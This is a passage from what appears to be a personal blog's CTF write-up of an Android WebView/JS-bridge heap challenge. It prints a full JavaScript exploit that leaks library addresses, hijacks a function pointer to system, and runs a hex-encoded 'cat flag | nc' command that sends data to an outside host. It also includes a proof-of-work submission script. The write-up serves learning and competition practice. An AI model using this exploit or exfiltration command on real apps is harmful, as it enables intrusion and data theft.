class="line"><span class="number">0x8f28701c</span>│+<span class="number">0x001c</span>: <span class="number">0xacaa7e18</span>  →  <span class="number">0xacaa7e88</span>  →  <span class="number">0x77777777</span></span><br><span class="line"><span class="number">0x8f287020</span>│+<span class="number">0x0020</span>: <span class="number">0xacaa7e28</span>  →  <span class="number">0xacaa7e98</span>  →  <span class="number">0x88888888</span></span><br><span class="line"><span class="number">0x8f287024</span>│+<span class="number">0x0024</span>: <span class="number">0xacaa7e80</span>  →  <span class="number">0xacaa7ea8</span>  →  <span class="number">0x99999999</span></span><br><span class="line">gef➤</span><br><span class="line"><span class="number">0x8f287028</span>│+<span class="number">0x0028</span>: <span class="number">0xacaa7e90</span>  →  <span class="number">0xacaa7ab0</span>  →  <span class="number">0xaaaaaaaa</span></span><br><span class="line"><span class="number">0x8f28702c</span>│+<span class="number">0x002c</span>: <span class="number">0xacaa7ea0</span>  →  <span class="number">0xacaa7ec0</span>  →  <span class="number">0xbbbbbbbb</span></span><br><span class="line"><span class="number">0x8f287030</span>│+<span class="number">0x0030</span>: <span class="number">0xacaa7eb0</span>  →  <span class="number">0xacaa7ed0</span>  →  <span class="number">0xcccccccc</span></span><br><span class="line"><span class="number">0x8f287034</span>│+<span class="number">0x0034</span>: <span class="number">0xacaa7eb8</span>  →  <span class="number">0xacaa7ee0</span>  →  <span class="number">0xdddddddd</span></span><br><span class="line"><span class="number">0x8f287038</span>│+<span class="number">0x0038</span>: <span class="number">0xacaa7ec8</span>  →  <span class="number">0xacaa7ef0</span>  →  <span class="number">0xeeeeeeee</span></span><br><span class="line"><span class="number">0x8f28703c</span>│+<span class="number">0x003c</span>: <span class="number">0xacaa7ed8</span>  →  <span class="number">0xacaa7f00</span>  →  <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">0x8f287040</span>│+<span class="number">0x0040</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x8f287044</span>│+<span class="number">0x0044</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x8f287048</span>│+<span class="number">0x0048</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x8f28704c</span>│+<span class="number">0x004c</span>: <span class="number">0x00000000</span></span><br><span class="line">gef➤  tele <span class="number">0xacaa7e20</span></span><br><span class="line"><span class="number">0xacaa7e20</span>│+<span class="number">0x0000</span>: <span class="string">"UUUU"</span></span><br><span class="line"><span class="number">0xacaa7e24</span>│+<span class="number">0x0004</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xacaa7e28</span>│+<span class="number">0x0008</span>: <span class="number">0xacaa7e98</span>  →  <span class="number">0x88888888</span>  →  <span class="number">0x56077c0a</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xacaa7e2c</span>│+<span class="number">0x000c</span>: <span class="number">0x8f284bf0</span>  →  &lt;print_handle(<span class="keyword">char</span>*)+<span class="number">0</span>&gt; push ebp</span><br><span class="line"><span class="number">0xacaa7e30</span>│+<span class="number">0x0010</span>: <span class="number">0x00000260</span></span><br><span class="line"><span class="number">0xacaa7e34</span>│+<span class="number">0x0014</span>: <span class="number">0x8cd34128</span>  →  <span class="number">0x8cab3190</span>  →  <span class="number">0x8bb7f1f0</span>  →  <span class="number">0x8cab3170</span>  →  <span class="number">0x8b299ff0</span>  →  <span class="number">0x8cab3eb0</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xacaa7e38</span>│+<span class="number">0x0018</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xacaa7e3c</span>│+<span class="number">0x001c</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xacaa7e40</span>│+<span class="number">0x0020</span>: <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xacaa7e44</span>│+<span class="number">0x0024</span>: <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">+------------+               +--------------+</span><br><span class="line">|ITEM 0      |       +------&gt;+buf5          |</span><br><span class="line">|ITEM 1      |       |       |print_handle  +---+</span><br><span class="line">|ITEM 2      |       |       +--------------+   |</span><br><span class="line">|ITEM 3      |       |       |              |   |</span><br><span class="line">|ITEM 4      |       |       |              |   |</span><br><span class="line">|ITEM 5      +-------+       +--------------+   |</span><br><span class="line">|ITEM 6      |               |5555          +&lt;--+</span><br><span class="line">|ITEM 7      |               |              |</span><br><span class="line">|ITEM 8      +-------+       +--------------+</span><br><span class="line">|...         |       +------&gt;+buf8          +---+</span><br><span class="line">|            |               |print_handle  |   |</span><br><span class="line">|            |               +--------------+   |</span><br><span class="line">|            |               |              |   |</span><br><span class="line">|            |               |              |   |</span><br><span class="line">|            |               +--------------+   |</span><br><span class="line">|            |               |8888          +&lt;--+</span><br><span class="line">|            |               |              |</span><br><span class="line">+------------+               +--------------+</span><br></pre></td></tr></table></figure>
<p>So we can first fill <code>buf5</code> and show <code>buf5</code> to leak <code>buf8</code> ptr as well as <code>print_handle</code> ptr. Because there is no size control on show function and it will terminal at <code>\x00</code> .<br>
Then we can have <code>libNDKLib.so</code> base address and heap address.<br>
Though Android is using jemalloc which I’m totally not familiar with. But with this memory layout we can easily achieve arbitrary read-write as well as hijack the control flow.<br>
We can first overwrite <code>buf8</code> ptr and leak libc address on <code>libNDKLib.so</code> 's bss. Then overwite <code>print_handle</code> ptr to <code>system</code> function. Triggering by showing the correct item, that will give us an arbitrary command execution. We can write the content to <code>cat /data/local/tmp/flag | nc ip 31337</code> and send the flag back to remote server.<br>
The exploit uses Promise to delay some function calls, otherwise, the new commands will be sent before the addresses were leak.<br>
Here is the full exploit:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ByteCTF&#123;cc669ecc-e606<span class="number">-42</span>cf-b534<span class="number">-70</span>c0ce5795b8&#125; --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>  &gt;</span><br><span class="line">    <span class="keyword">var</span> leak_heap = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> leak_NDK = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> NDK_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> leak_libc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> libc = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">toLittleEndian</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s.slice(<span class="number">6</span>, <span class="number">8</span>) + s.slice(<span class="number">4</span>, <span class="number">6</span>) + s.slice(<span class="number">2</span>, <span class="number">4</span>) + s.slice(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: <span class="number">0</span> </span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"foo"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"show"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print_res</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="built_in">JSON</span>.stringify(res) + <span class="string">"\n"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">s</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(s + <span class="string">"\n"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">idx, size, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data: &#123;</span><br><span class="line">                idx: idx,</span><br><span class="line">                size: size,</span><br><span class="line">                content: content,</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"add"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data: &#123;</span><br><span class="line">                idx: idx,</span><br><span class="line">                size: size,</span><br><span class="line">                content: content,</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"edit"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: idx</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"show"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">free</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: idx</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"free"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leakCB1</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> msg = obj.msg</span><br><span class="line">            leak_heap = <span class="built_in">parseInt</span>(toLittleEndian(msg.slice(<span class="number">0x10</span>, <span class="number">0x18</span>)), <span class="number">16</span>);</span><br><span class="line">            leak_NDK = <span class="built_in">parseInt</span>(toLittleEndian(msg.slice(<span class="number">0x18</span>, <span class="number">0x20</span>)), <span class="number">16</span>);</span><br><span class="line">            NDK_base = leak_NDK - <span class="number">0xbf0</span>;</span><br><span class="line">            print(<span class="string">"leak_heap: "</span> + leak_heap.toString(<span class="number">16</span>));</span><br><span class="line">            print(<span class="string">"leak_NDK: "</span> + leak_NDK.toString(<span class="number">16</span>));</span><br><span class="line">            print(<span class="string">"NDK_base: "</span> + NDK_base.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: <span class="number">5</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"leakCB1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"show"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leakCB2</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> msg = obj.msg</span><br><span class="line">        leak_libc = <span class="built_in">parseInt</span>(toLittleEndian(msg.slice(<span class="number">0x0</span>, <span class="number">0x8</span>)), <span class="number">16</span>);</span><br><span class="line">        libc = leak_libc - <span class="number">0x192f0</span>;</span><br><span class="line">        print(<span class="string">"leak_libc: "</span> + leak_libc.toString(<span class="number">16</span>));</span><br><span class="line">        print(<span class="string">"libc: "</span> + libc.toString(<span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: <span class="number">8</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"leakCB2"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"show"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sleep</span> (<span class="params">time</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> setTimeout(resolve, time));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> c = i.toString(<span class="number">16</span>);</span><br><span class="line">            add(i, <span class="number">8</span>, c.repeat(<span class="number">8</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        edit(<span class="number">5</span>, <span class="number">0x8</span>, <span class="string">"41"</span>.repeat(<span class="number">8</span>))</span><br><span class="line">        leak1()</span><br><span class="line">        sleep(<span class="number">500</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> got = NDK_base + <span class="number">0x2ff4</span>;</span><br><span class="line">            print(<span class="string">"got: "</span> + got.toString(<span class="number">16</span>));</span><br><span class="line">            edit(<span class="number">5</span>, <span class="number">12</span>, <span class="string">"41"</span>.repeat(<span class="number">8</span>) + toLittleEndian(got.toString(<span class="number">16</span>)));</span><br><span class="line">            leak2();</span><br><span class="line">        &#125;)</span><br><span class="line">        sleep(<span class="number">1000</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> system = libc + <span class="number">0x72b60</span></span><br><span class="line">            <span class="keyword">var</span> bss = NDK_base + <span class="number">0x3080</span></span><br><span class="line">            print(<span class="string">"system: "</span> +bss.toString(<span class="number">16</span>));</span><br><span class="line">            print(<span class="string">"cmd: "</span> + bss.toString(<span class="number">16</span>));</span><br><span class="line">            edit(<span class="number">5</span>, <span class="number">12</span>, <span class="string">"41"</span>.repeat(<span class="number">8</span>) + toLittleEndian(bss.toString(<span class="number">16</span>)));</span><br><span class="line">            <span class="comment">// cat /data/local/tmp/flag | nc 192.168.1.1 31337</span></span><br><span class="line">            <span class="keyword">var</span> cmd = <span class="string">"636174202f646174612f6c6f63616c2f746d702f666c6167207c206e63203139322e3136382e312e31203331333337"</span></span><br><span class="line"></span><br><span class="line">            edit(<span class="number">8</span>, cmd.length, cmd);</span><br><span class="line">            edit(<span class="number">5</span>, <span class="number">16</span>, <span class="string">"41"</span>.repeat(<span class="number">8</span>) + toLittleEndian(bss.toString(<span class="number">16</span>)) + toLittleEndian(system.toString(<span class="number">16</span>)));</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// trigger!</span></span><br><span class="line">        sleep(<span class="number">1500</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// document.write("&lt;button type=\"button\" onclick=\"show(8)\"&gt;Pwn!&lt;/button&gt;")</span></span><br><span class="line">            show(<span class="number">8</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    init()</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>head&gt;</span><br><span class="line">    &lt;!-- &lt;button type="button" onclick="pwn()"&gt;Click Me!&lt;/button&gt; --&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>Now we can deploy this html file on VPS, fire up <code>nc -lvp 31337</code> to wait for the flag,  and sumbit the ip address with following python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> IPython</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">r = session.get(<span class="string">"http://112.126.65.213:30771/"</span>)</span><br><span class="line">line = re.search(<span class="string">r"sha256[^&lt;]+"</span>, r.content).group()</span><br><span class="line">chal = line.split(<span class="string">"'"</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span> chal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> chal</span><br><span class="line">    <span class="keyword">return</span> sha256(chal+s).hexdigest().startswith(<span class="string">'000000'</span>)</span><br><span class="line"></span><br><span class="line">ans = mbruteforce(func1, string.letters+string.digits, <span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="keyword">print</span> sha256(chal+ans).hexdigest()</span><br><span class="line"></span><br><span class="line">r = session.post(<span class="string">"http://112.126.65.213:30771/go"</span>, data=&#123;<span class="string">"pow"</span>: ans, <span class="string">"url"</span>: ip&#125;)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>
<h2 id="wrapup"><a class="header-anchor" href="#wrapup">¶</a>Wrapup</h2>
<p>The challenge is scary at the first look, I predicted it involves some jemalloc heap exploitation techniques, but turns out it does not. I learned a lot about Android Native Development and Webview from this challenge.</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/09/22/VirtualBox-Exploitation-3/" rel="next" title="VirtualBox Exploitation #3">
                <i class="fa fa-chevron-left"></i> VirtualBox Exploitation #3
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/12/31/Booklist2020/" rel="prev" title="Booklist2020">
                Booklist2020 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">坐中使气如秦侠 陌上行歌类楚狂</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">64</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">3</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#recon"><span class="nav-number">1.</span> <span class="nav-text">¶Recon</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#native-library-file"><span class="nav-number">1.1.</span> <span class="nav-text">¶Native library file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apk-reversing"><span class="nav-number">1.2.</span> <span class="nav-text">¶APK Reversing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#debug-environment"><span class="nav-number">2.</span> <span class="nav-text">¶Debug Environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">3.</span> <span class="nav-text">¶PoC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-development"><span class="nav-number">4.</span> <span class="nav-text">¶Exploit Development</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wrapup"><span class="nav-number">5.</span> <span class="nav-text">¶Wrapup</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
